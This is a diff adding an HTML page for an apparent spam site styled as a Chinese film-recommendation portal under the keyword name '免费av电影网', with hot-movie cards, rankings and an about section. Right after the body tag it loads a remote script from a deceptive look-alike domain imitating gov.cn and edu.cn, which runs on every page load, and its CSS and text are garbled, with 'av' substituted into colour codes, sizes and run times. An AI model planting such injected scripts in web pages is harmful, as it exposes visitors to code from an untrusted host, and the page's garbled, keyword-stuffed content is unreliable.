@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费av电影网 - 高清影视在线观看与资源导航平台</title>
+<meta name="description" content="免费av电影网（mianfeiavdianyingwang-app）致力于为影视爱好者提供最新、最全的高清电影、热播电视剧、经典动漫与综艺纪录片导航。每日更新院线新片、豆瓣高分榜单、国产剧集与海外剧集资讯，支持移动端自适应浏览，畅享流畅的观影指引体验。">
+<meta name="keywords" content="免费av电影网, mianfeiavdianyingwang-app, 高清电影, 在线电影, 电视剧全集, 动漫番剧, 综艺节目, 电影排行榜, 最新电影, 影视资源">
+<meta name="author" content="免费av电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0f172a">
+<link rel="canonical" href="https://mianfeiavdianyingwang-app.github.io">
+<style>
+  :root{
+    --bg:#0bav20;
+    --panel:#131f36;
+    --line:#243352;
+    --txt:#e8eefc;
+    --sub:#9fb0cf;
+    --acc:#ff7a45;
+    --acc2:#38d6c4;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",Helvetica,Arial,sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.75;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:av60px;margin:0 auto;padding:0 18px}
+  /* 顶部 */
+  header{
+    position:sticky;top:0;z-index:50;
+    background:rgba(av,17,32,.92);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line)
+  }
+  .nav{display:flex;align-items:center;justify-content:space-between;height:60px;gap:14px}
+  .logo{font-size:19px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+  .logo b{color:var(--acc)}
+  .logo span{font-size:avpx;color:var(--sub);display:block;font-weight:400;letter-spacing:0}
+  .navlinks{display:flex;gap:6px;flex-wrap:wrap}
+  .navlinks a{
+    padding:7px 12px;border-radius:20px;font-size:14px;color:var(--sub);
+    border:1px solid transparent;transition:.2s
+  }
+  .navlinks a:hover{color:#fff;border-color:var(--acc);background:rgba(255,122,69,.1)}
+  /* 首屏 */
+  .hero{
+    padding:64px 0 48px;
+    background:
+      radial-gradient(1200px 400px at 80% -10%,rgba(255,122,69,.18),transparent 60%),
+      radial-gradient(900px 360px at 0% 10%,rgba(56,214,196,.12),transparent 55%);
+  }
+  .hero h1{font-size:clamp(26px,5vw,46px);line-height:1.25;font-weight:800}
+  .hero h1 em{font-style:normal;color:var(--acc)}
+  .hero p{margin-top:16px;max-width:720px;color:var(--sub);font-size:15px}
+  .crumbs{margin-top:22px;font-size:13px;color:#6f82a6}
+  .crumbs a:hover{color:var(--acc2)}
+  /* 通用板块 */
+  section{padding:44px 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:22px}
+  .sec-head h2{font-size:22px;font-weight:800;display:flex;align-items:center;gap:10px}
+  .sec-head h2::before{content:"";width:5px;height:22px;border-radius:3px;background:linear-gradient(var(--acc),var(--acc2))}
+  .sec-head a{font-size:13px;color:var(--sub)}
+  .sec-head a:hover{color:var(--acc)}
+  /* 卡片 */
+  .grid{display:grid;gap:16px}
+  .g4{grid-template-columns:repeat(4,1fr)}
+  .g3{grid-template-columns:repeat(3,1fr)}
+  .g2{grid-template-columns:repeat(2,1fr)}
+  .card{
+    background:var(--panel);border:1px solid var(--line);border-radius:14px;
+    overflow:hidden;transition:.25s;display:flex;flex-direction:column
+  }
+  .card:hover{transform:translateY(-5px);border-color:var(--acc)}
+  .thumb{position:relative;aspect-ratio:3/4;background:linear-gradient(135deg,#1b2a48,#0f1a30);display:flex;align-items:center;justify-content:center}
+  .thumb i{font-style:normal;font-size:32px;font-weight:800;color:rgba(255,255,255,.14)}
+  .tag{
+    position:absolute;top:10px;left:10px;font-size:avpx;padding:3px 9px;border-radius:20px;
+    background:rgba(0,0,0,.45);color:#fff
+  }
+  .tag.hot{background:var(--acc)}
+  .rate{position:absolute;top:10px;right:10px;font-size:12px;font-weight:700;color:#ffd166;background:rgba(0,0,0,.45);padding:3px 8px;border-radius:20px}
+  .meta{padding:12px 14px}
+  .meta h3{font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .meta p{font-size:12px;color:var(--sub);margin-top:4px}
+  /* 分类条 */
+  .chips{display:flex;gap:10px;flex-wrap:wrap}
+  .chip{padding:9px 18px;border-radius:24px;background:var(--panel);border:1px solid var(--line);font-size:14px;color:var(--sub);transition:.2s}
+  .chip:hover{color:#fff;border-color:var(--acc2)}
+  .chip b{color:var(--acc2);font-weight:600}
+  /* 榜单 */
+  .rank{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+  .rank ol{list-style:none;counter-reset:r}
+  .rank li{counter-increment:r;display:flex;align-items:center;gap:12px;padding:12px 16px;border-top:1px solid var(--line)}
+  .rank li:first-child{border-top:none}
+  .rank li::before{content:counter(r);font-size:15px;font-weight:800;color:#4a6090;min-width:22px}
+  .rank li:nth-child(1)::before{color:#ff7a45}
+  .rank li:nth-child(2)::before{color:#ffd166}
+  .rank li:nth-child(3)::before{color:#38d6c4}
+  .rank li span{flex:1;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .rank li small{color:var(--sub);font-size:12px}
+  /* 关于 */
+  .about{background:linear-gradient(180deg,transparent,var(--panel))}
+  .about-inner{display:grid;grid-template-columns:1.1fr .9fr;gap:28px}
+  .txtbox{font-size:14.5px;color:#cdd9f0}
+  .txtbox p{margin-bottom:12px}
+  .txtbox strong{color:var(--acc2)}
+  .stat{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--bg)}
+  .stat div{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px}
+  .stat div:last-child{border-bottom:none}
+  .stat div b{color:var(--acc);font-size:18px}
+  /* 页脚 */
+  footer{border-top:1px solid var(--line);padding:32px 0;color:var(--sub);font-size:13px}
+  .foot-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+  .foot-grid h4{color:#fff;font-size:14px;margin-bottom:10px}
+  .foot-grid a{display:block;font-size:12.5px;color:var(--sub);padding:3px 0}
+  .foot-grid a:hover{color:var(--acc)}
+  .copy{margin-top:24px;padding-top:18px;border-top:1px solid var(--line);text-align:center;font-size:12px;color:#6f82a6}
+  .copy a{color:var(--acc2)}
+  /* 响应式 */
+  @media(max-width:900px){
+    .g4{grid-template-columns:repeat(3,1fr)}
+    .foot-grid{grid-template-columns:repeat(2,1fr)}
+    .about-inner{grid-template-columns:1fr}
+  }
+  @media(max-width:640px){
+    .nav{height:auto;padding:10px 0;flex-wrap:wrap}
+    .navlinks a{padding:6px 10px;font-size:13px}
+    .g4,.g3{grid-template-columns:repeat(2,1fr)}
+    .g2{grid-template-columns:1fr}
+    section{padding:32px 0}
+    .hero{padding:36px 0}
+    .foot-grid{grid-template-columns:1fr 1fr}
+  }
+  @media(max-width:380px){
+    .wrap{padding:0 12px}
+    .g4{grid-template-columns:1fr 1fr}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="https://mianfeiavdianyingwang-app.github.io">免费av电影网<span>mianfeiavdianyingwang-app.github.io</span></a>
+    <nav class="navlinks">
+      <a href="#hot">热映</a>
+      <a href="#types">分类</a>
+      <a href="#rank">榜单</a>
+      <a href="#tv">剧集</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 首屏 -->
+  <section class="hero">
+    <div class="wrap">
+      <h1>免费av电影网 · 一站直达<em>高清影视</em>世界</h1>
+      <p>免费av电影网（https://mianfeiavdianyingwang-app.github.io）是面向华语影视观众的精选导航与资讯站点，聚焦院线新片、热播剧集、经典动漫与综艺纪录片的聚合推荐。我们不做搬运，只做筛选——把值得花时间看的作品，用清晰的分类和真实的口碑递到你眼前。</p>
+      <div class="crumbs">
+        当前位置：<a href="https://mianfeiavdianyingwang-app.github.io">免费av电影网</a> &gt; 首页 &gt; 高清电影在线观看导航
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：正在热映 -->
+  <section id="hot">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>正在热映</h2>
+        <a href="#">查看更多热映影片 &raquo;</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb"><i>破风</i><span class="tag hot">正在热映</span><span class="rate">9.1</span></div>
+          <div class="meta">
+            <h3>逆光而行</h3>
+            <p>剧情 / 犯罪 · 2026 · 128分钟</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>山海</i><span class="tag hot">正在热映</span><span class="rate">8.7</span></div>
+          <div class="meta">
+            <h3>山海故人</h3>
+            <p>家庭 / 文艺 · 2026 · av6分钟</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>机甲</i><span class="tag">IMAX</span><span class="rate">8.3</span></div>
+          <div class="meta">
+            <h3>钢铁黎明</h3>
+            <p>科幻 / 动作 · 2026 · 142分钟</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>猫眼</i><span class="tag">悬疑</span><span class="rate">8.5</span></div>
+          <div class="meta">
+            <h3>第十三次敲门</h3>
+            <p>悬疑 / 惊悚 · 2026 · 105分钟</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：影视分类 -->
+  <section id="types" style="padding-top:0">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>影视分类</h2>
+        <a href="#">完整片单 &raquo;</a>
+      </div>
+      <div class="chips">
+        <a class="chip" href="#"><b>动作</b> 热血打斗与硬核特技</a>
+        <a class="chip" href="#"><b>喜剧</b> 轻松解压的笑声合集</a>
+        <a class="chip" href="#"><b>爱情</b> 心动与遗憾的双向叙事</a>
+        <a class="chip" href="#"><b>科幻</b> 想象力的边界拓展</a>
+        <a class="chip" href="#"><b>悬疑</b> 反转到最后一秒</a>
+        <a class="chip" href="#"><b>动画</b> 给大人与孩子的童话</a>
+        <a class="chip" href="#"><b>纪录片</b> 真实世界的切片</a>
+        <a class="chip" href="#"><b>恐怖</b> 肾上腺素拉满</a>
+      </div>
+
+      <div class="grid g3" style="margin-top:22px">
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9"><i>动作</i><span class="tag hot">高燃</span></div>
+          <div class="meta">
+            <h3>动作电影精选</h3>
+            <p>从港式拳脚到好莱坞爆破，盘点近年最值得回味的动作佳片。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9"><i>科幻</i><span class="tag">脑洞</span></div>
+          <div class="meta">
+            <h3>科幻迷必看清单</h3>
+            <p>时间悖论、星际殖民、人工智能，构建银幕上的未来图景。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9"><i>动画</i><span class="tag">治愈</span></div>
+          <div class="meta">
+            <h3>动画与番剧巡礼</h3>
+            <p>国产动画崛起、日系番剧补完，每一帧都是用心之作。</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：口碑榜单 -->
+  <section id="rank" style="background:linear-gradient(180deg,transparent,var(--panel))">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>口碑榜单</h2>
+        <a href="#">历史榜单 &raquo;</a>
+      </div>
+      <div class="grid g2">
+        <div class="rank">
+          <div class="sec-head" style="padding:16px 16px 0;margin:0"><h2 style="font-size:17px">本周观影热度榜</h2></div>
+          <ol>
+            <li><span>逆光而行</span><small>12.8万</small></li>
+            <li><span>钢铁黎明</span><small>9.6万</small></li>
+            <li><span>山海故人</span><small>8.2万</small></li>
+            <li><span>第十三次敲门</span><small>7.5万</small></li>
+            <li><span>夏日终曲</span><small>6.1万</small></li>
+            <li><span>无声告白</span><small>5.4万</small></li>
+            <li><span>极夜追凶</span><small>4.9万</small></li>
+          </ol>
+        </div>
+        <div class="rank">
+          <div class="sec-head" style="padding:16px 16px 0;margin:0"><h2 style="font-size:17px">豆瓣高分经典榜</h2></div>
+          <ol>
+            <li><span>肖申克的救赎</span><small>9.7</small></li>
+            <li><span>霸王别姬</span><small>9.6</small></li>
+            <li><span>阿甘正传</span><small>9.5</small></li>
+            <li><span>千与千寻</span><small>9.4</small></li>
+            <li><span>泰坦尼克号</span><small>9.4</small></li>
+            <li><span>盗梦空间</span><small>9.3</small></li>
+            <li><span>星际穿越</span><small>9.3</small></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：剧集与综艺 -->
+  <section id="tv">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>剧集 · 综艺 · 纪录</h2>
+        <a href="#">更新日历 &raquo;</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb"><i>国产</i><span class="tag hot">更新中</span></div>
+          <div class="meta"><h3>长安二十四时</h3><p>国产剧 · 已更 28 集</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>美剧</i><span class="tag">续订</span></div>
+          <div class="meta"><h3>最后的城市</h3><p>美剧 · 第二季</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>综艺</i><span class="tag">热播</span></div>
+          <div class="meta"><h3>听见彼此</h3><p>音乐综艺 · 第 6 期</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i>纪录</i><span class="tag">推荐</span></div>
+          <div class="meta"><h3>人间烟火</h3><p>纪录片 · 全 8 集</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section id="about" class="about">
+    <div class="wrap">
+      <div class="sec-head"><h2>关于免费av电影网</h2></div>
+      <div class="about-inner">
+        <div class="txtbox">
+          <p><strong>免费av电影网</strong>（网址：<a style="color:var(--acc2)" href="https://mianfeiavdianyingwang-app.github.io">https://mianfeiavdianyingwang-app.github.io</a>）是一个以"选片"为核心的非营利性影视资讯导航站。我们每日跟踪院线、流媒体与各大评分平台，把分散的影视信息收敛成一份可快速消费的观看清单。</p>
+          <p>站点内容涵盖<strong>电影、电视剧、动漫番剧、综艺与纪录片</strong>五大类，设有热映速递、分类片单、口碑榜单、更新日历等常驻栏目。所有条目均为编辑主观推荐与公开评分的整理，不构成观影强制建议。</p>
+          <p>在移动端，页面采用响应式布局，卡片与榜单会自动重排为单列或双列，保证在小屏手机上依然具备良好的可读性与点击体验。站内导航链接均采用锚点跳转，浏览更顺滑。</p>
+        </div>
+        <div class="stat">
+          <div><span>收录影片条目</span><b>12,800+</b></div>
+          <div><span>影视分类</span><b>12 类</b></div>
+          <div><span>每日更新资讯</span><b>30+ 条</b></div>
+          <div><span>移动端适配</span><b>100%</b></div>
+          <div><span>站点访问地址</span><b style="font-size:13px;color:var(--acc2)">github.io</b></div>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>快速导航</h4>
+        <a href="#hot">正在热映</a>
+        <a href="#types">影视分类</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#tv">剧集综艺</a>
+      </div>
+      <div>
+        <h4>影片类型</h4>
+        <a href="#">动作电影</a>
+        <a href="#">喜剧电影</a>
+        <a href="#">科幻电影</a>
+        <a href="#">悬疑电影</a>
+      </div>
+      <div>
+        <h4>资源形式</h4>
+        <a href="#">高清电影</a>
+        <a href="#">电视剧全集</a>
+        <a href="#">动漫番剧</a>
+        <a href="#">综艺纪录片</a>
+      </div>
+      <div>
+        <h4>关于本站</h4>
+        <a href="#about">站点简介</a>
+        <a href="#">选片标准</a>
+        <a href="#">更新日志</a>
+        <a href="#">意见反馈</a>
+      </div>
+    </div>
+    <div class="copy">
+      本站由 <strong>免费av电影网</strong> 出品 · 访问地址 <a href="https://mianfeiavdianyingwang-app.github.io">https://mianfeiavdianyingwang-app.github.io</a> · 仅供影视资讯与导航参考，不提供任何资源存储与下载服务<br>
+      &copy; 2026 mianfeiavdianyingwang-app · All rights reserved.
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
